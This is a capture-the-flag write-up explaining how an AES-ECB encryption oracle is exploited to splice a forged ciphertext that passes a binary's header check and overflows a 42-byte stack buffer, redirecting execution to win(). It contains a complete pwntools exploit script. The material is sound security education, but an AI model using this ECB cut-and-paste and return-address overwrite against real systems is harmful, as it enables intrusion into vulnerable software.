## 1. Challenge Overview
This challenge bridges two distinct domains: **Cryptography** and **Binary Exploitation**. 
We are given an encryption oracle (`dispatch` script) and a vulnerable C binary. The objective is to leverage a flaw in the AES-ECB encryption implementation to bypass the C binary's input validation, leading to a stack-based buffer overflow and ultimately hijacking execution to a hidden `win()` function.

---

## 2. Vulnerability Analysis

### The Cryptography Flaw: AES-ECB Mode
The `dispatch` python script encrypts standard input using AES in ECB (Electronic Codebook) mode. ECB encrypts each 16-byte block independently. 
The script constructs the plaintext like this before encrypting:
`[VERIFIED (8 bytes)] + [Length (8 bytes)] + [User Input (up to 16 bytes)]`

Because ECB blocks are stateless, we can request the encryption of specific 16-byte chunks of data, capture the resulting ciphertext blocks, and concatenate them together. The decryption routine will process them sequentially without detecting the manipulation.

### The Memory Flaw: Unbounded Decryption
The C binary contains a critical logic error. It strictly validates the first 16 bytes (Block 1) of the decrypted payload:
```c
assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); 
assert(plaintext.length <= 16);
```
However, it ignores the verified length parameter when decrypting the remainder of the payload. It decrypts the entire concatenated ciphertext directly into a 42-byte fixed stack buffer (plaintext.message), allowing for a massive buffer overflow.

---

## 3. Exploitation Methodology

### Phase 1: Bypassing the Oracle (The EOF Hang)

To bypass the binary's validation, we first needed a "Golden Header"—a valid first block where the length is 0.
When sending an empty byte string (b"") to the dispatch script, sys.stdin.buffer.read1() caused the script to hang indefinitely waiting for input.
**Solution:** We bypassed this by sending an explicit EOF (End of File) signal using pwntools' shutdown('send') immediately after our payload, forcing the script to process the empty input and return the encrypted Golden Header.

### Phase 2: Safe Recon (Avoiding SIGABRT)

Attempting a standard buffer overflow with a 200-byte cyclic pattern resulted in a SIGABRT. The massive overwrite destroyed critical stack variables, causing internal program assertions to fail before the function could return.

**Solution:** We utilized a "Safe Recon" approach. We encrypted a harmless 16-byte payload (b'A' * 16). Because this fit safely within the 42-byte buffer, the program gracefully exited and printed its diagnostic stack dump:

The program's memory status:
- the input buffer starts at 0x7ffe333bc610
- the saved return address (previously to main) is at 0x7ffe333bc678
- the address of win() is 0x4018f7.

### Phase 3: Exact Offset Calculation

With the memory layout provided by the Safe Recon run, we calculated the exact padding required to reach the Instruction Pointer (RIP):
- Return Address Location: 0x7ffe333bc678
- Buffer Start Location: - 0x7ffe333bc610
- Difference: 0x68 hex -> 104 bytes

We need exactly 104 bytes of padding to overwrite the saved return address.

---

## 4. The Final Exploit

We constructed a plaintext payload consisting of 104 bytes of padding followed by the address of the win() function. We then passed this payload through our automated ECB chunking function, appended the encrypted blocks to our Golden Header, and fired it at the vulnerable binary.

```python
from pwn import *

# --- Configuration ---
vuln_path = '/challenge/vulnerable-overflow' 
dispatch_path = '/challenge/dispatch'

# --- Crypto Oracle Functions ---
def get_golden_header():
    """Generates a valid Block 1 where header='VERIFIED' and length=0"""
    p = process(dispatch_path, level='error')
    p.shutdown('send') # Prevents read1() hang
    return p.recvall()[:16]

def encrypt_block(block):
    """Uses dispatch to encrypt a 16-byte block via ECB mode"""
    assert len(block) == 16
    p = process(dispatch_path, level='error')
    p.send(block)
    p.shutdown('send') 
    return p.recvall()[16:32]

def encrypt_payload(payload):
    """Chunks arbitrary payload into 16-byte encrypted ECB blocks"""
    pad_len = (16 - (len(payload) % 16)) % 16
    if pad_len != 0:
        payload += b'A' * pad_len
    
    enc = b""
    for i in range(0, len(payload), 16):
        enc += encrypt_block(payload[i:i+16])
    return enc

# --- Exploit Execution ---
# 1. Math extracted from Safe Recon dump
OFFSET = 104
WIN_ADDR = 0x4018f7

# 2. Build plaintext payload
plaintext_payload = b'A' * OFFSET + p64(WIN_ADDR)

# 3. Assemble final ciphertext via ECB cut-and-paste
print("[*] Encrypting payload block by block...")
final_ciphertext = get_golden_header() + encrypt_payload(plaintext_payload)
print("[+] Payload encrypted successfully!")

# 4. Fire at vulnerable binary
p = process(vuln_path)
p.send(final_ciphertext)

# 5. Retrieve flag
print(p.recvall(timeout=2).decode(errors='ignore'))
```

---

## Concusion

This challenge highlights the dangers of using AES-ECB and the necessity of verifying bounds after decryption, rather than relying on unauthenticated headers. By isolating the encryption oracle to construct a "Frankenstein" ciphertext and manually calculating stack offsets, we successfully bypassed the logic checks and hijacked execution flow.
